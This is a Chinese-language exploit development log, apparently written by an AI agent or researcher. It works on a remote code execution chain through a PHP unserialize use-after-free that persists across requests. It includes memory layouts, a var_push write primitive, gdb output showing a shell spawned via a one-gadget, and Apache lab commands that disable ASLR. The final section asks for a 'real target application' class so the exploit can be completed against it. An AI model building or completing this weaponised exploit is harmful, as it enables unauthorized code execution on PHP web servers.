# 新根因：pre-RINIT `BG(unserialize)` 跨请求残留 UAF（纯 HTTP 线）

本文件记录用户提供的新利用链与本线独立复现进展。**此前 `session_unset`/`session_encode` 的自定义 PHP 利用不再作为有效结果**（违反“不许写特定 PHP、完全远程”的要求），相关页面已移出 webroot。

---

## 1. 新链（用户情报）

1. 第一请求在 upload-progress 解码大 session 时 OOM，遗留 `BG(unserialize).level=1` 和**已释放的 `data`**。
2. 第二请求通过两个 8214 字节 multipart 参数回收该 8216 字节对象。
3. 利用反斜杠折叠构造合法 48 位 `data->last` 指针。
4. 二进制 progress marker 伪造 `var_entries`，将 `var_push` 转化为可选地址写入。
5. 两级 `var_entries` 跳板最终覆盖 `zend_object->handlers`。
6. 对象销毁进入 glibc one-gadget；GDB 确认：
   ```
   VAR_PUSH ... destination=0x7f9d62671000 rval=0x7f9d62664980
   VAR_PUSH ... destination=0x7f9d62602608 rval=0x7f9d62664940
   process 2544 is executing new program: /usr/bin/dash
   ```

漏洞并非公开分析声称的 progress 缓存桶 UAF，而是 **pre-RINIT 阶段 `BG(unserialize)` 状态跨请求残留**。

---

## 2. 源码映射

### 2.1 8216 字节对象

`ext/standard/var_unserializer.re`：

```c
#define VAR_ENTRIES_MAX 1018
typedef struct {
    zend_long used_slots;     // 8
    void *next;               // 8
    zval *data[1018];         // 8144
} var_entries;                // 8160

struct php_unserialize_data {
    var_entries      *last;          // 0
    var_dtor_entries *first_dtor;    // 8
    var_dtor_entries *last_dtor;     // 16
    HashTable        *allowed_classes; // 24
    HashTable        *ref_props;     // 32
    zend_long         cur_depth;     // 40
    zend_long         max_depth;     // 48
    var_entries       entries;       // 56
};                                    // sizeof = 56 + 8160 = 8216
```

gdb 已确认 `sizeof(struct php_unserialize_data) == 8216`。

### 2.2 生命周期

```c
php_var_unserialize_init():
    if (BG(serialize_lock) || !BG(unserialize).level) {
        d = emalloc(8216);
        d->last = &d->entries;
        ...
        BG(unserialize).data = d;
        BG(unserialize).level = 1;
    } else {
        d = BG(unserialize).data;   // stale reuse
        ++BG(unserialize).level;
    }

php_var_unserialize_destroy():
    if (BG(serialize_lock) || BG(unserialize).level == 1) {
        var_destroy(&d); efree(d);
    }
    if (!BG(serialize_lock) && !--BG(unserialize).level)
        BG(unserialize).data = NULL;
```

OOM/`zend_bailout` 跳过 `PHP_VAR_UNSERIALIZE_DESTROY`，`level` 保持 1、`data` 悬空；下一次 pre-RINIT 的 `unserialize` 会直接复用该结构。

### 2.3 `var_push` 写原语

```c
static inline void var_push(php_unserialize_data_t *var_hashx, zval *rval)
{
    var_entries *var_hash = (*var_hashx)->last;
    if (var_hash->used_slots == VAR_ENTRIES_MAX) {
        var_hash = emalloc(sizeof(var_entries));
        ...
        (*var_hashx)->last->next = var_hash;
        (*var_hashx)->last = var_hash;
    }
    var_hash->data[var_hash->used_slots++] = rval;
}
```

若 `data->last` 由攻击者控制，则写入地址为：

```text
*(zval**)(last + offsetof(var_entries, data) + used_slots*8) = rval
= last + 16 + used_slots*8
```

`rval` 是 `zval*`（可预测的 unserializer 临时值地址）；`used_slots` 也可通过回收内容控制。两级跳板可以把第一次写入的指针作为第二次的 `last`/目标，最终覆盖 `zend_object->handlers`，对象销毁进入 one-gadget。

---

## 3. 本线纯 HTTP 复现进度

### 3.1 前置：用 upload-progress 造大 session（纯 HTTP）

- Apache lab 配置可切：64M + `session.upload_progress.cleanup Off` 用于造文件；8M + cleanup On 用于 A/B。
- 请求 0：multipart `PHPSESSID` + `PHP_SESSION_UPLOAD_PROGRESS=<4MB 'A'>` + 文件部分。
- 实测：`/tmp/sess_bgtest123` = **4,194,655 字节**。
- 小 session：`/tmp/sess_bgsmall123` = 351 字节，用于第二请求正常解码。

### 3.2 请求 A：post-RINIT 解码大 session OOM

目标页为普通 session 页面：

```php
<?php session_start(); echo "ok\n"; ?>
```

请求：`GET /index.php`，`Cookie: PHPSESSID=bgtest123`。会话解码 4MB 数据，8M 限制下 OOM。

实测：

```text
HTTP/1.1 200 OK
Fatal error: Allowed memory size of 8388608 bytes exhausted ...

basic_globals.unserialize.level = 1
basic_globals.unserialize.data  = 0x7ffff5e6d000
```

该 `data` 是 `php_unserialize_data`（8216B）；`last=&entries`（+0x38）。请求 shutdown 后该对象已释放（BG 指针悬空）。

### 3.3 请求 B：pre-RINIT 复用悬空 BG，参数回收结构

形状（`tools/bg_b.py` / `tools/bg_b_file.py`）：

- 无文件：`PHPSESSID=bgsmall123`、`PHP_SESSION_UPLOAD_PROGRESS=pwn`、两个 8214 字节字段 `p1`/`p2`（boundary 10 字符）。
- END cleanup 在 RINIT 之前调用 `php_session_initialize` → `s_read` → `php_var_unserialize_init`，复用 stale `BG.data`。

实测 gdb：

```text
INIT level=1 data=0x7ffff5e6d000
0x7ffff5e6d000: 0x00007ffff5e6d030 0x41da9b9294603d72
0x7ffff5e6d010: 0x00007ffff5e6d020 0x51da9b9294603d72
0x7ffff5e6d020: 0x00007ffff5e6d000 0x71da9b9294603d72
0x7ffff5e6d030: 0x00007ffff5e6d040 0x31da9b9294603d72
INIT level=0 data=(nil)
```

- `BG.level=1`、`data` 仍是 A 的地址，说明 pre-RINIT 复用成功；
- 8216 结构已被 multipart 内容重写，`data->last` 等字段变成指向结构内部的指针（0x...6d030/6d020/6d000/6d040）；
- 带文件版本（`bg_b_file.py`）在 FILE_START 解码时，结构被 `a.bin`/`Content-` 等 multipart header 内容重占，随后在 `tmp_var` 处解引用 `last_dtor` 崩溃：

```text
INIT level=1 data=0x7ffff5e6d000
0x...6d000: 0x0000006e69622e61 0x554acc7090e8c40e
0x...6d010: 0x2d746e65746e6f43 0x354acc0065707954
0x...6d020: 0x00007ffff5e6d040 0x554acc7090e8c40e
SIGSEGV addr=(nil)
#0 tmp_var (num=1, ...)
#1 var_tmp_var
#2 ps_srlzr_decode_php
#3 php_session_decode
#4 php_session_initialize
#5 php_session_rfc1867_update
#6 php_session_rfc1867_callback
#7 rfc1867_post_handler
```

### 3.4 已确认的事实

- `BG(unserialize).level=1` 与 `data` 在 A 的 post-RINIT OOM 后跨请求保留；
- B 的 pre-RINIT `php_var_unserialize_init` 会复用该悬空 `data`（无新分配）；
- 两个 8214 字节 multipart 参数/解析器缓冲区可以重写 8216 字节结构；
- 结构字段被当作 `var_entries`/`var_dtor_entries` 指针使用，`tmp_var`/`var_push` 会沿这些指针读写（已出现 `tmp_var` 崩溃）。

### 3.5 尚未完成

- 用用户链中的“反斜杠折叠”精确控制 `data->last` 为**任意合法 48 位指针**，而不是当前的结构内自指针；
- 构造 fake `var_entries`，控制 `used_slots`，把 `var_push` 变成目标地址写入；
- 两级跳板覆盖 `zend_object->handlers`，以及 glibc one-gadget 地址（ASLR 下需要 leak）；
- 把 A 的 OOM/大 session 准备做成完全远程可重复的流程（当前 lab 需要 Apache 配置在 64M/cleanup Off 与 8M/cleanup On 间切换；真实目标依赖应用自身的大 session 和 memory_limit）。

---

## 4. 复现命令（lab）

```bash
# 1) 64M + cleanup Off 造 session（纯 HTTP）
sudo sed -i 's/php_admin_value memory_limit .*/php_admin_value memory_limit 64M/; s/php_admin_value session.upload_progress.cleanup .*/php_admin_value session.upload_progress.cleanup Off/' /etc/apache2/conf-available/php8426.conf
sudo apache2ctl -k stop; sudo bash -c 'ulimit -c unlimited; setarch $(uname -m) -R /usr/sbin/apache2ctl -k start'
cd ~/php-lab
SID=bgsmall123 python3 bg_create.py 8
SID=bgtest123 python3 bg_create.py 4194304

# 2) 8M + cleanup On，A 解码大 session OOM
sudo sed -i 's/php_admin_value memory_limit .*/php_admin_value memory_limit 8M/; s/php_admin_value session.upload_progress.cleanup .*/php_admin_value session.upload_progress.cleanup On/' /etc/apache2/conf-available/php8426.conf
sudo apache2ctl -k stop; sudo bash -c 'ulimit -c unlimited; setarch $(uname -m) -R /usr/sbin/apache2ctl -k start'
python3 bg_cookie_a.py        # GET + Cookie PHPSESSID=bgtest123，确认 OOM

# 3) B：pre-RINIT 复用 BG
python3 bg_b.py               # 无文件，两个 8214 参数
# 或 python3 bg_b_file.py     # 带文件，FILE_START 解码
```

gdb 观测点：

```gdb
b php_var_unserialize_init
commands
silent
printf "INIT level=%u data=%p\n", basic_globals.unserialize.level, basic_globals.unserialize.data
x/8gx basic_globals.unserialize.data
continue
end
```

---

## 5. 与旧文档的关系

- `NOTES.md` 第 3/10 节的 `session_unset`/`session_encode` 自定义 PHP 利用**不再作为有效交付**；它们证明了 Defect D/泄漏机制，但违反当前“无目标侧特定 PHP、纯 HTTP”的约束。
- 旧利用页已移到 `~/php-lab/offline/`，webroot 只保留普通 `index.php`。
- 新线继续以 `BG(unserialize)` UAF 为准；下一步核心是 8216 结构字段的精确布局与 `var_push` 两级写。

---

## 6. 参考日志

- `logs/bg_gf.log` — post-RINIT A + B pre-RINIT `INIT level=1`（结构未被参数覆盖的版本）。
- `logs/bg_gi.log` — post-RINIT A + B 带文件，结构被 multipart 内容重占并在 `tmp_var` 崩溃。
- `logs/bg_gj.log` — post-RINIT A + B 无文件，两个 8214 参数，结构内自指针。

---

## 7. 2026-10-21 追加：watchpoint 揭示的分配器行为（RCE 前最后障碍）

对 A 后的 `BG.data`（本例 `0x7ffff5e6d000`）下硬件 watchpoint，再发 B（无文件、两个 8214 参数），得到：

```text
WATCH#1 val=0x7461642d6d726f66   # "form-data"
  #0 memcpy
  #1 _estrndup
  #2 php_ap_getword
  #3 rfc1867_post_handler
WATCH#2 val=0x7ffff5e6d010
  #0 zend_mm_set_next_free_slot
  #1 zend_mm_free_small (bin_num=1, ptr=0x7ffff5e6d000)
  #2 zend_mm_free_heap
  #3 _efree
  #4 rfc1867_post_handler
WATCH#3 val=0x7fff656d616e   # "name="
WATCH#6 val=0x316c6c616d736762 # "bgsmall1" (PHPSESSID value)
  #1 multipart_buffer_read_body
```

结论：在我们的 post-RINIT A 场景下，**8216 字节的 `php_unserialize_data` 块已被 Zend MM 回收并拆成 16 字节小 bin**，B 解析时先由 `_estrndup("form-data")`、`"name="`、PHPSESSID 值等小字符串反复占用 `0x...6d000`；因此两个 8214 参数没有按预期整块占据该地址，`data->last` 读到的是 small-bin 空闲链指针（0x...6d030 等），不是攻击者可控的 48 位指针。

`zend_mm_free_small(bin_num=1)` 对应最小的 16 字节 bin；`form-data`(10B)/`name=`(6B)/`bgsmall123`(11B) 都落在这一 bin。struct 头部 56 字节被拆到 `0x...6d000/6d010/6d020/6d030` 四个 16B slot，且空闲链会覆盖每个 slot 的第一个 qword。

### 下一步（RCE）

1. **让 8216 块保持为大块空闲**，而不是被拆成 small bins：
   - 尝试不同的 A 结束方式（pre-RINIT OOM 不 shutdown vs post-RINIT shutdown；`unclean_shutdown`/`report_memleaks` 标志），使 B 启动时的堆回收把该块留在 large-free 链；
   - 或在 B 的最前面先分配一个 8193/8215 的大缓冲（两个 8214 参数前置），抢在 small-bin 拆分之前占据该块。
2. 一旦 `data->last` 可控：
   - 设 `last_dtor=0` 让 `tmp_var` 走 `emalloc` 分支；
   - 在参数缓冲/相邻大块中伪造 `var_entries`（`used_slots`、`next`、`data[]`），把 `var_push` 的写入目标设为 `zend_object->handlers`；
   - 两级跳板 + 对象销毁 + glibc one-gadget。
3. ASLR 放到 RCE 之后：新链没有现成的纯 HTTP 泄漏；可考虑 `var_push` 写入本身构造的读/写、或同一 BG UAF 的受控越界读，禁止再用之前自定义 PHP 的 `session_encode` 泄漏。

### 证据

- watchpoint 原始日志：`logs/bg_watch.log`（本轮 `/tmp/gw.log`）。

---

## 8. RCE 的真正前置：`BG(serialize_lock)=1`（target-app 依赖）

源码核对结果：

```c
PHPAPI void php_var_unserialize_destroy(php_unserialize_data_t d) {
    if (BG(serialize_lock) || BG(unserialize).level == 1) {
        var_destroy(&d);
        efree(d);                 // 释放 8216 块
    }
    if (!BG(serialize_lock) && !--BG(unserialize).level) {
        BG(unserialize).data = NULL;
    }
}
```

只有 `BG(serialize_lock) == 1` 时，才会出现“**d 已被 efree，但 BG.level 仍为 1、BG.data 仍指向 d**”的悬空状态；这也是 large-free 块（不会被整堆 shutdown 拆成 small bin）的来源。

`BG(serialize_lock)++/--` 的位置：

- `ext/standard/var_unserializer.re` 约 277/294 行：调用对象 `__wakeup` / `__unserialize` 前后；
- 类查找/autoload/unserialize_callback_func 调用前后（约 1232/1256/1268 行）；
- `ext/standard/var.c` 855/876：serialize 魔术方法。

因此攻击链的第一请求必须是：**session 数据里包含一个对象，其 `__wakeup`/`__unserialize`（或 autoload/unserialize_callback_func）在解码时触发 OOM**。OOM 的 `zend_bailout` 跳过 `BG(serialize_lock)--`，随后外层 destroy 看到 lock=1，`efree(d)` 但不清 BG，留下 large-free 悬空 8216 块。

我们 lab 里的大 session 只含数组/字符串（upload-progress 生成的 progress 数据），没有对象魔术方法，因此：

- 普通解码 OOM：destroy 根本没执行，`d` 仍分配（我们早前 pre-RINIT A 的 `data` 内存完整）；
- post-RINIT OOM + 请求 shutdown：整堆回收，8216 块被拆成 16 字节 small bin（watchpoint 已证实），8214 参数无法整块回收。

**结论：这条链在“vanilla session 页面 + 纯 HTTP 构造的数组 session”上不可达；它要求目标应用在 session 中放入带 `__wakeup`/`__unserialize` 的对象（或配置 autoload/unserialize_callback_func）。** 这是应用层依赖，不是 B 请求参数能补的。

### 继续所需的决定

- 允许在 lab 目标页加一个**仅用于验证的 scaffold 类**（`__wakeup` 里大分配 OOM），先把后面的 `var_entries`/`zend_object->handlers`/one-gadget 打通；最终 exploit 不包含该 PHP，只把它当作目标应用已有 gadget 的替身。
- 或提供真实目标应用里进入 session 的对象/类（哪个应用、哪个 session 键、什么 magic method），我按该对象构造大 session。
- 在拿到上述任一条件前，继续在 vanilla 页面上硬做只能靠伪造/自定义 PHP，违反当前约束。
